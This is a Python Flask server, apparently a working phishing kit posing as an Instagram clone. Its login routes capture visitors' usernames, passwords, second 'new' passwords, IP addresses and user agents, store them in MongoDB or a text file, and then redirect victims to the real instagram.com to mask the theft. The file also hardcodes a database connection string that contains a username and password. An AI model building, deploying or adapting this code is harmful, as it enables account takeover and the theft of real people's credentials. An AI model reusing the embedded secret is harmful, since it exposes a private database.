from flask import Flask, request, redirect, session, render_template, send_from_directory
from pymongo import MongoClient
from datetime import datetime
import os

app = Flask(__name__, static_folder='.')
app.secret_key = os.environ.get('SECRET_KEY', 'instagram-clone-secret-key-change-this-in-production')

# MongoDB Configuration
MONGODB_URI = 'mongodb+srv://igrizzz69:zzyANcI7XyqQqGqv@cluster0.aw94qzg.mongodb.net/?appName=Cluster0'
MONGODB_DATABASE = 'instagram_clone'
MONGODB_COLLECTION = 'users'

# Initialize MongoDB client
try:
    client = MongoClient(MONGODB_URI)
    db = client[MONGODB_DATABASE]
    collection = db[MONGODB_COLLECTION]
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    client = None

def get_user_ip():
    """Get user's real IP address (handles proxies)"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

@app.route('/')
def index():
    """Redirect to disclaimer page"""
    return redirect('/disclaimer.html')

@app.route('/disclaimer.html')
def disclaimer_page():
    """Serve disclaimer page"""
    return send_from_directory('.', 'disclaimer.html')

@app.route('/login.html')
def login_page():
    """Serve login page"""
    return send_from_directory('.', 'login.html')

@app.route('/set-password.html')
def set_password_page():
    """Serve password setup page"""
    return send_from_directory('.', 'set-password.html')

@app.route('/login.php', methods=['POST'])
def login():
    """Handle login form submission"""
    try:
        # Get form data
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        
        # Validate input
        if not username or not password:
            return redirect('/login.html?error=empty')
        
        # Get user metadata
        ip_address = get_user_ip()
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Prepare document
        user_data = {
            'username': username,
            'initial_password': password,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'timestamp': timestamp,
            'created_at': datetime.utcnow(),
            'status': 'pending_password_setup'
        }
        
        # Insert into MongoDB
        if client:
            result = collection.insert_one(user_data)
            user_id = str(result.inserted_id)
            print(f"✅ User data saved to MongoDB: {username} from {ip_address}")
        else:
            # Fallback to file if MongoDB fails
            with open('usernames.txt', 'a') as f:
                f.write(f"Instagram Username: {username} Pass: {password} IP: {ip_address} Time: {timestamp}\n")
            user_id = 'fallback'
            print(f"⚠️ Saved to file (MongoDB unavailable): {username}")
        
        # Store user ID in session
        session['user_id'] = user_id
        session['username'] = username
        
        # Redirect to password setup page
        return redirect('/set-password.html')
        
    except Exception as e:
        print(f"❌ Error in login: {e}")
        return redirect('/login.html?error=server')

@app.route('/save-password.php', methods=['POST'])
def save_password():
    """Handle password setup form submission"""
    try:
        # Check if user session exists
        if 'user_id' not in session:
            return redirect('/login.html')
        
        # Get form data
        new_password = request.form.get('new_password', '').strip()
        confirm_password = request.form.get('confirm_password', '').strip()
        user_id = session.get('user_id')
        
        # Validate input
        if not new_password or not confirm_password:
            return redirect('/set-password.html?error=empty')
        
        if new_password != confirm_password:
            return redirect('/set-password.html?error=mismatch')
        
        # Update user password in MongoDB
        if client and user_id != 'fallback':
            from bson import ObjectId
            collection.update_one(
                {'_id': ObjectId(user_id)},
                {'$set': {
                    'new_password': new_password,
                    'confirm_password': confirm_password,
                    'password_updated_at': datetime.utcnow(),
                    'status': 'completed'
                }}
            )
            print(f"✅ Password updated for user: {session.get('username')}")
        else:
            # Fallback to file
            with open('usernames.txt', 'a') as f:
                f.write(f"New Password for {session.get('username')}: {new_password}\n")
            print(f"⚠️ Password saved to file: {session.get('username')}")
        
        # Clear session
        session.clear()
        
        # Redirect to Instagram
        return redirect('https://instagram.com')
        
    except Exception as e:
        print(f"❌ Error in save_password: {e}")
        session.clear()
        return redirect('https://instagram.com')

# Serve static files (JS, CSS, images)
@app.route('/<path:path>')
def serve_static(path):
    """Serve static files"""
    return send_from_directory('.', path)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Instagram Clone Server Starting...")
    print("="*60)
    print(f"📁 Serving from: {os.getcwd()}")
    print(f"🌐 Access at: http://localhost:8000")
    print(f"🔗 Login page: http://localhost:8000/login.html")
    print("="*60 + "\n")
    
    # Get port from environment variable (for Render) or default to 8000
    port = int(os.environ.get('PORT', 8000))
    
    # Run Flask app
    # Use 0.0.0.0 to allow external connections (required for Render)
    app.run(host='0.0.0.0', port=port, debug=False)
